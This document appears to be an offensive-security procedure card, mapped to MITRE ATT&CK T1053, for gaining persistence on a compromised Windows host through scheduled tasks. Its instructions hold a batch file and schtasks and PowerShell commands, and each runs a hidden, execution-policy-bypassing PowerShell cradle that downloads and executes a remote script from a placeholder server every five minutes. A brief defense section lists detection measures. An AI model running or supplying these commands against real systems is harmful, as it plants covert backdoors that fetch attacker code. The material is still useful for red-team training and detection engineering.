---
id: a31b8c81-1465-4c21-8316-94fc34706b81
type: procedure
verified: true
submitted: true
created_at: '2020-03-13T01:36:22.842340+00:00'
updated_at: '2023-05-25T20:02:42.073114+00:00'
tactics:
  - '[[tactics/Execution|TA0002 - Execution]]'
  - '[[tactics/Persistence|TA0003 - Persistence]]'
  - '[[tactics/Privilege Escalation|TA0004 - Privilege Escalation]]'
techniques:
  - '[[techniques/Scheduled Task|T1053 - Scheduled Task]]'
sub_techniques: []
tags:
  - '[[tags/persistence]]'
commands:
  - '[[commands/schtasks-create-repeating-minute-task]]'
  - '[[commands/powershell-register-repeating-scheduled-task]]'
platforms:
  - Windows
tools: []
validated: true
---

# Create-Windows-Scheduled-Task-for-Persistence

## Summary

This procedure demonstrates how to create a Windows scheduled task using either Command Prompt or PowerShell to establish persistence on a compromised Windows system. The task is configured to repeat every 5 minutes and executes a batch script or PowerShell command that downloads and runs a remote script, allowing attackers to maintain access even after reboots or logoffs.

## Description

Scheduled tasks in Windows provide a legitimate mechanism for automating processes, but adversaries often abuse them for persistence by scheduling malicious payloads to run at regular intervals or on system events like startup. This procedure focuses on creating a task that triggers every 5 minutes to execute a payload hosted remotely, evading basic detection by blending with normal system activity. It requires administrative privileges for task creation and is applicable in post-exploitation scenarios where initial access has been gained. The technique maps to MITRE ATT&CK T1053 (Scheduled Task) under Execution, Persistence, and Privilege Escalation tactics, commonly used in real-world attacks to ensure long-term control over the target.

## Requirements

1. Administrative privileges on the target Windows system (required for creating scheduled tasks).
2. Network access to a remote server hosting the payload script (e.g., PowerShell script at http://$_TARGET_IP/$_SCRIPT.ps1).
3. Command Prompt or PowerShell access on the target (via initial foothold like a shell).
4. A batch file or direct PowerShell execution capability for the payload.

## Defense

- Monitor scheduled task creation via Windows Event Logs (Event ID 4698 in Security log) and restrict task creation to trusted users via Group Policy.
- Enable PowerShell logging and script block logging to detect downloads from external sources using WebClient.DownloadString.
- Use application whitelisting (e.g., AppLocker) to block execution of unsigned scripts or batch files in sensitive directories like C:\Windows\Tasks.
- Network segmentation and proxy inspection to block unauthorized downloads from attacker-controlled servers.

## Objectives

1. Establish persistence by scheduling a repeating task that executes a malicious payload.
2. Download and run remote code without direct file drops on disk where possible.
3. Verify task creation and execution to confirm ongoing access.
4. Minimize detection by using short intervals and hidden execution.

## Instructions

### Step 1: Create Payload Batch Script (Command Prompt Method)

**Context**: For the Command Prompt approach, first create a batch file that serves as the task's execution target. This script downloads and executes a remote PowerShell payload, avoiding issues with special characters in the schtasks command. Place the batch file in a system directory like C:\Windows\Tasks to blend with legitimate files.

**Code** ([[codes/Batch-Download-and-Execute-PowerShell-Script]]):

```batch
@ECHO OFF
powershell.exe -ep bypass -windowstyle hidden "iex(New-Object Net.WebClient).downloadString('http://$_TARGET_IP/$_SCRIPT.ps1')"
```

> Save this code to C:\Windows\Tasks\shell.bat. The -ep bypass flag evades execution policy restrictions, and -windowstyle hidden runs it invisibly. Expected output: No visible console; the PowerShell script executes silently if the download succeeds.

### Step 2: Register Scheduled Task via Command Prompt

**Context**: Use schtasks to create a task that runs the batch script every 5 minutes. This establishes persistence without needing PowerShell.

**Command** ([[commands/schtasks-create-repeating-minute-task]]):

```command_prompt
schtasks /Create /SC MINUTE /MO 5 /TN pwn /TR "cmd.exe /C 'C:\Windows\Tasks\shell.bat'"
```

> This command creates a task named "pwn" that repeats every 5 minutes (/SC MINUTE /MO 5) and executes the batch file via cmd.exe. Run as administrator. Expected output: Confirmation message indicating successful task creation.

### Step 3: Register Scheduled Task via PowerShell

**Context**: Alternatively, use PowerShell cmdlets for more flexibility in defining actions and triggers. This method directly embeds the download and execution in the task action, eliminating the need for a separate batch file.

**Command** ([[commands/powershell-register-repeating-scheduled-task]]):

```powershell
$action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument "-ep bypass -windowstyle hidden iex(New-Object Net.WebClient).downloadString('http://$_TARGET_IP/$_SCRIPT.ps1')"
$trigger = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 5)
Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "pwn" -Description "pwn"
```

> This creates an action to run PowerShell with the download command, sets a trigger starting now and repeating every 5 minutes, and registers the task. Expected output: A table showing the task as "Ready" in the Task Scheduler.
